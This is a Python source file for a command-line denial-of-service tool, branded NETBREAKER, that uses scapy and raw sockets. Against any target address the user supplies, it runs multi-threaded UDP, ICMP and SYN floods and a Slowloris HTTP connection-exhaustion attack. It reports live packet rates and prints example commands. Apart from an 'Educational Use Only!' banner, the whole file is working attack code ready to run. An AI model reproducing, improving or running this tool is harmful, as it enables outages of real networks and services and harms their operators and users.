#!/usr/bin/env python3
from scapy.all import IP, UDP, Raw, RandShort, send, conf, ICMP
from colorama import Fore, Style, init
import sys
import time
import threading
import random
import socket

init(autoreset=True)


class GhostDDoS:
    def __init__(self):
        self.packets_sent = 0
        self.running = False
        self.spinner = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        self.spinner_idx = 0

    def banner(self):
        print(
            Fore.RED
            + Style.BRIGHT
            + """
    ╔═╗╔═╗ ╔═╗╔═╗╦ ╦╔╦╗╔═╗
    ╠═╣╠═╝ ║  ║ ║║ ║ ║║╚═╗
    ╩ ╩╩   ╚═╝╚═╝╚═╝═╩╝╚═╝
    ╔═╗╔═╗╔═╗╦═╗╔╦╗╔═╗╦═╗
    ╠═╣║ ║║ ║╠╦╝ ║ ╠═╣╠╦╝
    ╩ ╩╚═╝╚═╝╩╚═ ╩ ╩ ╩╩╚═
        """
            + Fore.YELLOW
            + "      NETBREAKER v2.0 by jusot99"
            + Fore.CYAN
            + "\n        Educational Use Only!\n"
        )

    def show_stats(self):
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            rate = self.packets_sent / elapsed if elapsed > 0 else 0
            spinner = self.spinner[self.spinner_idx % len(self.spinner)]
            self.spinner_idx += 1

            print(
                f"\r{Fore.CYAN}{spinner} {Fore.YELLOW}Packets: {self.packets_sent} | {Fore.GREEN}Rate: {rate:.1f} pkt/s | {Fore.MAGENTA}Time: {elapsed:.1f}s",
                end="",
                flush=True,
            )
            time.sleep(0.1)

    def flood_udp(self, target_ip, target_port, threads=10, iface=None):
        self.running = True
        stats_thread = threading.Thread(target=self.show_stats, daemon=True)
        stats_thread.start()

        print(f"{Fore.GREEN}[+] Starting UDP flood with {threads} threads...")
        print(f"{Fore.YELLOW}[+] Target: {target_ip}:{target_port}")
        print(f"{Fore.CYAN}[+] Press Ctrl+C to stop\n")

        def worker():
            while self.running:
                try:
                    src_port = RandShort()
                    payload = "X" * random.randint(100, 1500)
                    pkt = (
                        IP(dst=target_ip)
                        / UDP(sport=src_port, dport=target_port)
                        / Raw(load=payload)
                    )
                    send(pkt, verbose=0, iface=iface)
                    self.packets_sent += 1
                except Exception:
                    pass

        thread_pool = []
        for _ in range(threads):
            thread = threading.Thread(target=worker, daemon=True)
            thread_pool.append(thread)
            thread.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Fore.RED}[!] Attack stopped by user")

        print(f"{Fore.YELLOW}[+] Final stats: {self.packets_sent} packets sent")

    def flood_icmp(self, target_ip, threads=10, iface=None):
        self.running = True
        stats_thread = threading.Thread(target=self.show_stats, daemon=True)
        stats_thread.start()

        print(f"{Fore.GREEN}[+] Starting ICMP flood with {threads} threads...")
        print(f"{Fore.YELLOW}[+] Target: {target_ip}")
        print(f"{Fore.CYAN}[+] Press Ctrl+C to stop\n")

        def icmp_worker():
            while self.running:
                try:
                    pkt = IP(dst=target_ip) / ICMP()
                    send(pkt, verbose=0, iface=iface)
                    self.packets_sent += 1
                except Exception:
                    pass

        thread_pool = []
        for _ in range(threads):
            thread = threading.Thread(target=icmp_worker, daemon=True)
            thread_pool.append(thread)
            thread.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Fore.RED}[!] Attack stopped by user")

        print(f"{Fore.YELLOW}[+] Final stats: {self.packets_sent} packets sent")

    def slowloris(self, target_ip, target_port, sockets=150, iface=None):
        print(f"{Fore.GREEN}[+] Starting Slowloris attack...")
        print(f"{Fore.YELLOW}[+] Target: {target_ip}:{target_port}")
        print(f"{Fore.CYAN}[+] Creating {sockets} sockets...")

        sockets_list = []
        connected_count = 0

        try:
            # Create sockets with progress
            for i in range(sockets):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target_ip, target_port))
                    s.send(
                        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode()
                    )
                    sockets_list.append(s)
                    connected_count += 1
                    print(
                        f"{Fore.GREEN}[+] Socket {connected_count}/{sockets} connected",
                        end="\r",
                    )
                    time.sleep(0.1)  # Small delay to avoid overwhelming
                except Exception as e:
                    continue

            print(
                f"\n{Fore.YELLOW}[+] Successfully connected {connected_count} sockets"
            )
            print(f"{Fore.CYAN}[+] Keeping sockets open... Press Ctrl+C to stop")

            # Keep sockets alive
            while True:
                for s in sockets_list[:]:  # Use slice copy for safe iteration
                    try:
                        s.send(b"X-a: b\r\n")
                        time.sleep(0.1)
                    except:
                        sockets_list.remove(s)
                        print(
                            f"{Fore.RED}[-] Socket disconnected, {len(sockets_list)} remaining"
                        )

                if len(sockets_list) == 0:
                    print(f"{Fore.RED}[!] All sockets disconnected")
                    break

                time.sleep(15)  # Send keep-alive every 15 seconds

        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Stopping Slowloris...")
        finally:
            # Cleanup
            for s in sockets_list:
                try:
                    s.close()
                except:
                    pass
            print(f"{Fore.YELLOW}[+] Closed {len(sockets_list)} sockets")

    def syn_flood(self, target_ip, target_port, threads=10, iface=None):
        from scapy.all import TCP

        self.running = True
        stats_thread = threading.Thread(target=self.show_stats, daemon=True)
        stats_thread.start()

        print(f"{Fore.GREEN}[+] Starting SYN flood with {threads} threads...")
        print(f"{Fore.YELLOW}[+] Target: {target_ip}:{target_port}")
        print(f"{Fore.CYAN}[+] Press Ctrl+C to stop\n")

        def syn_worker():
            while self.running:
                try:
                    src_port = RandShort()
                    pkt = IP(dst=target_ip) / TCP(
                        sport=src_port, dport=target_port, flags="S"
                    )
                    send(pkt, verbose=0, iface=iface)
                    self.packets_sent += 1
                except Exception:
                    pass

        thread_pool = []
        for _ in range(threads):
            thread = threading.Thread(target=syn_worker, daemon=True)
            thread_pool.append(thread)
            thread.start()

        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n\n{Fore.RED}[!] Attack stopped by user")

        print(f"{Fore.YELLOW}[+] Final stats: {self.packets_sent} packets sent")


def main():
    ddos = GhostDDoS()
    ddos.banner()

    if len(sys.argv) < 3:
        print(
            f"{Fore.CYAN}Usage: sudo python3 {sys.argv[0]} <target_ip> <target_port> [options]"
        )
        print(f"{Fore.YELLOW}Options:")
        print(f"  -t <threads>    Number of threads (default: 10)")
        print(f"  -i <interface>  Network interface")
        print(f"  --udp           UDP flood (default)")
        print(f"  --icmp          ICMP flood")
        print(f"  --syn           SYN flood")
        print(f"  --slowloris     Slowloris HTTP attack")
        print(f"\n{Fore.GREEN}Examples:")
        print(f"  {sys.argv[0]} 192.168.1.1 80 -t 50")
        print(f"  {sys.argv[0]} 10.0.0.1 443 --icmp -t 20")
        print(f"  {sys.argv[0]} example.com 80 --slowloris")
        print(f"  {sys.argv[0]} target.com 22 --syn -t 100")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    threads = 10
    iface = None
    mode = "udp"

    # Parse arguments
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "-t" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "-i" and i + 1 < len(sys.argv):
            iface = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--icmp":
            mode = "icmp"
            i += 1
        elif sys.argv[i] == "--syn":
            mode = "syn"
            i += 1
        elif sys.argv[i] == "--slowloris":
            mode = "slowloris"
            i += 1
        elif sys.argv[i] == "--udp":
            mode = "udp"
            i += 1
        else:
            i += 1

    try:
        if mode == "udp":
            ddos.flood_udp(target, port, threads, iface)
        elif mode == "icmp":
            ddos.flood_icmp(target, threads, iface)
        elif mode == "syn":
            ddos.syn_flood(target, port, threads, iface)
        elif mode == "slowloris":
            ddos.slowloris(target, port, iface=iface)
    except PermissionError:
        print(f"{Fore.RED}[!] Permission denied! Run with sudo")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")


if __name__ == "__main__":
    main()
